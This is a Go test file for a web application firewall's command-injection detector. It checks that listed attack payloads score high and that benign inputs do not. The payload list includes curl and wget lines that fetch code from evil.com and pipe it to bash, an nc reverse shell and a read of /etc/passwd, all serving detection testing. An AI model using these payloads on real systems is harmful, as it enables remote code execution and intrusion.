package cmdi

import (
	"testing"

	"github.com/ersinkoc/guardianwaf/internal/engine"
)

// Attack payloads that MUST be detected with score >= 50
var attackPayloads = []struct {
	name     string
	input    string
	minScore int
}{
	{"semicolon whoami", "; whoami", 65},
	{"semicolon cat passwd", "; cat /etc/passwd", 75},
	{"pipe id", "| id", 65},
	{"backtick id", "`id`", 80},
	{"dollar paren whoami", "$(whoami)", 80},
	{"and operator ls", "test && ls -la", 65},
	{"or operator id", "test || id", 65},
	{"bin bash path", "/bin/bash -c 'id'", 80},
	{"bin sh path", "/bin/sh -c 'whoami'", 80},
	{"python exec", "python -c 'import socket'", 80},
	{"curl reverse shell", "; curl http://evil.com/shell.sh | bash", 50},
	{"nc reverse shell", "; nc -e /bin/sh 10.0.0.1 4444", 75},
	{"base64 pipe", "echo dGVzdA== | base64 -d | sh", 50},
	{"newline injection", "test%0awhoami", 60},
	{"perl exec", "perl -e 'exec \"/bin/sh\"'", 80},
	{"wget download", "; wget http://evil.com/backdoor", 75},
}

// Benign inputs that must NOT trigger high scores
var benignInputs = []struct {
	name     string
	input    string
	maxScore int
}{
	{"normal text", "hello world", 0},
	{"email address", "user@example.com", 0},
	{"json data", `{"name": "John", "age": 30}`, 0},
	{"url with params", "https://example.com/page?q=test&lang=en", 0},
	{"math expression", "2 + 3 = 5", 0},
	{"filepath", "/home/user/documents/report.pdf", 0},
	{"simple sentence", "the quick brown fox jumps over the lazy dog", 0},
}

func TestDetect_AttackPayloads(t *testing.T) {
	for _, tt := range attackPayloads {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < minimum %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_BenignInputs(t *testing.T) {
	for _, tt := range benignInputs {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore > tt.maxScore {
				t.Errorf("input=%q: total score %d > maximum %d\nfindings: %+v",
					tt.input, totalScore, tt.maxScore, findings)
			}
		})
	}
}

func TestDetect_EmptyInput(t *testing.T) {
	findings := Detect("", "query")
	if findings != nil {
		t.Errorf("expected nil findings for empty input, got %v", findings)
	}
}

func TestDetect_FindingFields(t *testing.T) {
	findings := Detect("; whoami", "query")
	if len(findings) == 0 {
		t.Fatal("expected at least one finding")
	}

	for _, f := range findings {
		if f.DetectorName != "cmdi" {
			t.Errorf("DetectorName: expected 'cmdi', got %q", f.DetectorName)
		}
		if f.Category != "cmdi" {
			t.Errorf("Category: expected 'cmdi', got %q", f.Category)
		}
		if f.Location != "query" {
			t.Errorf("Location: expected 'query', got %q", f.Location)
		}
		if f.Score <= 0 {
			t.Errorf("Score should be > 0, got %d", f.Score)
		}
		if f.Description == "" {
			t.Error("Description should not be empty")
		}
		if f.Confidence <= 0 || f.Confidence > 1.0 {
			t.Errorf("Confidence should be in (0, 1.0], got %f", f.Confidence)
		}
	}
}

func TestDetector_Integration(t *testing.T) {
	det := NewDetector(true, 1.0)

	var _ engine.Detector = det

	if det.Name() != "cmdi-detector" {
		t.Errorf("expected name 'cmdi-detector', got %q", det.Name())
	}
	if det.DetectorName() != "cmdi" {
		t.Errorf("expected detector name 'cmdi', got %q", det.DetectorName())
	}
	if len(det.Patterns()) == 0 {
		t.Error("expected non-empty patterns list")
	}

	ctx := &engine.RequestContext{
		NormalizedPath: "/api/exec",
		NormalizedQuery: map[string][]string{
			"cmd": {"; whoami"},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionLog {
		t.Errorf("expected ActionLog, got %v", result.Action)
	}
	if result.Score < 50 {
		t.Errorf("expected score >= 50, got %d", result.Score)
	}
	if len(result.Findings) == 0 {
		t.Error("expected findings for CMDi payload")
	}
}

func TestDetector_Disabled(t *testing.T) {
	det := NewDetector(false, 1.0)

	ctx := &engine.RequestContext{
		NormalizedPath: "; whoami",
		NormalizedQuery: map[string][]string{
			"cmd": {"; cat /etc/passwd"},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionPass {
		t.Errorf("disabled detector should return ActionPass, got %v", result.Action)
	}
	if len(result.Findings) != 0 {
		t.Errorf("disabled detector should produce no findings, got %d", len(result.Findings))
	}
}

func TestDetector_Multiplier(t *testing.T) {
	input := "; whoami"

	det1 := NewDetector(true, 1.0)
	ctx1 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{"cmd": {input}},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}
	result1 := det1.Process(ctx1)

	det2 := NewDetector(true, 2.0)
	ctx2 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{"cmd": {input}},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}
	result2 := det2.Process(ctx2)

	if result1.Score == 0 {
		t.Fatal("baseline score should not be 0")
	}
	if result2.Score < result1.Score {
		t.Errorf("2x multiplier score %d should be >= 1x score %d", result2.Score, result1.Score)
	}
}

func TestCommandDatabase(t *testing.T) {
	if len(commandDatabase) < 60 {
		t.Errorf("expected at least 60 commands in database, got %d", len(commandDatabase))
	}

	mustHave := []string{
		"cat", "ls", "whoami", "id", "uname", "curl", "wget", "nc",
		"bash", "sh", "python", "perl", "ruby", "php", "chmod",
		"base64", "find", "grep", "mysql", "redis-cli",
	}
	for _, cmd := range mustHave {
		if !IsCommand(cmd) {
			t.Errorf("command %q should be in database", cmd)
		}
	}
}

func TestShellMetachars(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"; ls", true},
		{"| grep", true},
		{"`id`", true},
		{"$(whoami)", true},
		{"&& ls", true},
		{"|| id", true},
		{"> /tmp/out", true},
		{"hello world", false},
		{"normal text", false},
	}

	for _, tt := range tests {
		got := HasShellMetachar(tt.input)
		if got != tt.want {
			t.Errorf("HasShellMetachar(%q) = %v, want %v", tt.input, got, tt.want)
		}
	}
}

func BenchmarkDetect(b *testing.B) {
	input := "; whoami && cat /etc/passwd"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		Detect(input, "query")
	}
}
